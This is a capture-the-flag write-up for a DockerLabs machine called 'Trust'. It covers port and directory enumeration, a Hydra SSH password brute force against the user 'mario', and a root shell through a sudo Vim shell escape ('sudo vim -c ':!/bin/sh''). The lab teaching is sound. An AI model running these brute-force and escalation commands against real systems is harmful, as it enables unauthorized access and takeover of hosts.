# Trust

> Educational write-up for an authorized DockerLabs environment.

| | |
|---|---|
| **Platform** | DockerLabs |
| **IP** | 172.17.0.2 |
| **Date** | 25/08/2026 |
| **Difficulty** | Easy |
| **OS** | Linux |

---

## 1. Reconnaissance

### Nmap

We started with a full TCP port scan:

```bash
sudo nmap -p- -sC -sV --open --min-rate 1000 172.17.0.2

```

## The scan revealed two relevant services:

```text
22/tcp  SSH
80/tcp  HTTP
```

Since SSH requires valid credentials, the HTTP service became the primary enumeration target.

## 2. Web Enumeration

### WhatWeb

We first used WhatWeb to identify technologies and information exposed by the web server:

```bash
whatweb http://172.17.0.2
```

The target appeared to be running a default Apache2 web page.

We then inspected the HTTP response directly:

```bash
curl -s http://172.17.0.2
```

No significant additional information was found.

### Gobuster

We continued with directory and file enumeration:

```bash
gobuster dir \
-u http://172.17.0.2 \
-w /usr/share/wordlists/dirb/big.txt \
-x php,txt,bak,old \
--exclude-length 10701
```
A larger wordlist was used because the smaller common.txt wordlist did not provide useful results.

Several potentially interesting file extensions were also tested:

```text
php
txt
bak
old
```

Wildcard response

During enumeration, nonexistent resources returned the same response size:

10701 bytes

This caused false positives during Gobuster enumeration.

We therefore excluded responses with that content length:

--exclude-length 10701

This allowed us to filter the generic response and identify actual resources.

secret.php

### Gobuster discovered:
```text
/secret.php
```
The page displayed:

"Esta pagina no se puede hackear Mario!"

The name Mario was treated as a potential username.

This led to the following hypothesis:

mario may be a valid system account.

3. Initial Access
SSH Credential Attack

Since SSH was exposed and we had a potential username, we tested the hypothesis using Hydra:

```bash
hydra -l mario \
-P /usr/share/wordlists/rockyou.txt \
ssh://172.17.0.2
```
Hydra identified valid SSH credentials for the mario account.

The password is intentionally omitted from this public write-up.

We then authenticated through SSH:
```bash
ssh mario@172.17.0.2
```
This provided our initial shell on the target.

4. Post-Exploitation

After obtaining access, we first adjusted the terminal environment:

export TERM=xterm

This is a basic terminal environment adjustment that improves compatibility when interacting with the remote shell.

Host and User Enumeration

We identified our current context:
```bash
whoami
id
hostname
pwd
```
We then collected operating system and kernel information:

```bash
uname -a
cat /etc/os-release
```
This provided information about:

Current user
Group memberships
Hostname
Working directory
Kernel
Operating system
Local User Enumeration

We searched for accounts with interactive shells:

cat /etc/passwd | grep -E '/bin/bash|/bin/sh'

The relevant accounts included:
```text
root
mario
```
We also inspected the /home directory:

ls -la /home
5. Privilege Enumeration

The next step was checking the user's delegated sudo privileges:

sudo -l

The output showed that mario could execute Vim with elevated privileges.

This provided a direct privilege escalation path.

6. Network Enumeration

As part of the post-exploitation workflow, we also inspected the target's network configuration:
```bash
ip a
ip route
ss -lntup
```
This provided information about:

Network interfaces
IP addresses
Routing
Locally listening services

7. Local File Enumeration

We performed basic enumeration of the user's home directory:
```bash
ls -la ~
```
We also searched for files within /home:
```bash
find /home -maxdepth 3 -type f 2>/dev/null
```
No additional path was required for the final privilege escalation.

8. Privilege Escalation

The sudo -l output showed that mario could execute:

/usr/bin/vim

with elevated privileges.

Vim provides a shell escape functionality, which can be used to execute commands from within the editor.

One method is:
```bash
sudo vim -c ':!/bin/sh'
```
Alternatively:
```bash
sudo vim

Then, inside Vim:

:!/bin/sh
```
We verified the resulting privileges:
```bash
whoami
id
pwd
hostname
```
The resulting shell had root privileges.

9. Attack Path
HTTP (80)
    │
    ▼
secret.php
    │
    ▼
Potential username: mario
    │
    ▼
Hydra
    │
    ▼
Valid SSH credentials
    │
    ▼
SSH access
    │
    ▼
sudo -l
    │
    ▼
Vim allowed with elevated privileges
    │
    ▼
Vim shell escape
    │
    ▼
ROOT

10. Lessons Learned

### Reconnaissance
Full port enumeration helps identify the available attack surface.
When one service requires credentials, another exposed service may provide useful information.
Web Enumeration
Default web pages can still provide useful initial fingerprinting.
Wildcard responses can interfere with directory enumeration.
Response size can be used to filter false positives.
Backup and alternate file extensions can reveal interesting resources.
Initial Access
Small information leaks can become useful hypotheses.
A username discovered through web enumeration can be tested against another exposed service.
Post-Exploitation
Always identify the current user and privileges after obtaining a shell.
sudo -l should be part of the standard local enumeration workflow.
Network enumeration helps understand the target's position within an environment.
Privilege Escalation
Sudo permissions should always be investigated.
Programs capable of executing commands can sometimes provide a path to privilege escalation.
Disclaimer

This write-up was performed in an authorized educational lab environment.

The techniques described here should only be used against systems where you have explicit permission to perform security testing.